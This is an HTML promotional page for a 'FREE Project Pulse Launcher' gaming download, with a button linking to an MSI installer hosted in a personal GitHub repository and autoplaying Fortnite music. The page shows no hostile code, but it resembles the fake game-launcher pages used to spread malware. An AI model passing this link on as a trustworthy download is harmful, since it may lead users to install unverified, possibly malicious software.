<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Launcher</title>
    <link rel="icon" type="image/png" href="favicon.ico"> <!-- Favicon link -->
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #121212; /* Dark grey to black gradient */
            color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Hide scrollbars */
        }
        .container {
            display: flex; /* Use flexbox to align items */
            justify-content: space-between; /* Space between text and image */
            align-items: center;
            max-width: 1035px; /* Increased max-width by 15% */
            margin: 0 auto;
            padding: 23px; /* Increased padding by 15% */
            position: relative;
            z-index: 1;
        }
        .text-content {
            max-width: 57.5%; /* Increased max-width by 15% */
        }
        h1 {
            font-size: 4.17rem; /* Increased title size by 15% */
            color: #ffffff; /* White color for the title */
            margin-bottom: 1.39rem; /* Increased margin for larger title */
        }
        p {
            font-size: 1.67rem; /* Increased text size by 15% */
            color: #b0b0b0; /* Grey color */
            margin-bottom: 2.79rem; /* Increased margin for larger text */
        }
        .button {
            display: inline-block;
            padding: 20.9px 41.7px; /* Increased padding by 15% */
            font-size: 1.67rem; /* Increased button text size by 15% */
            color: #fff; /* Keep text color white */
            background: linear-gradient(45deg, #00c6ff, #0072ff); /* Blue gradient */
            background-size: 230% 230%; /* Increased size for smoother animation */
            border: none;
            border-radius: 5px;
            text-decoration: none;
            cursor: pointer;
            animation: gradientAnimation 3s ease infinite; /* Continuous gradient animation */
            transition: box-shadow 0.3s; /* Smooth transition for shadow */
        }
        .button:hover {
            box-shadow: 0 0 11.5px 3.45px rgba(255, 255, 255, 0.5); /* Subtle white glow effect */
        }
        .image {
            max-width: 69.5%; /* Increased image size by 15% */
            height: auto;
        }
        @keyframes gradientAnimation {
            0% {
                background-position: 0% 0%;
            }
            50% {
                background-position: 115% 115%;
            }
            100% {
                background-position: 0% 0%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="text-content">
            <h1>Start Your Journey<br>and Have Fun!</h1>
            <p>Download our FREE Project Pulse Launcher now for an enhanced gaming experience and join our vibrant community.</p>
            <!-- Button to download the launcher -->
            <a href="https://raw.githubusercontent.com/Thavipah/sigma/main/uploads/Project%20Pulse%20Setup.msi" class="button">Download Launcher</a>
        </div>
        <img src="example-image.png" alt="Promotional Image" class="image">
    </div>
    <!-- Audio player -->
    <audio id="background-audio" src="https://media.fortniteapi.io/audio/musicpacks/musicpack_023_og.mp3" autoplay loop></audio>
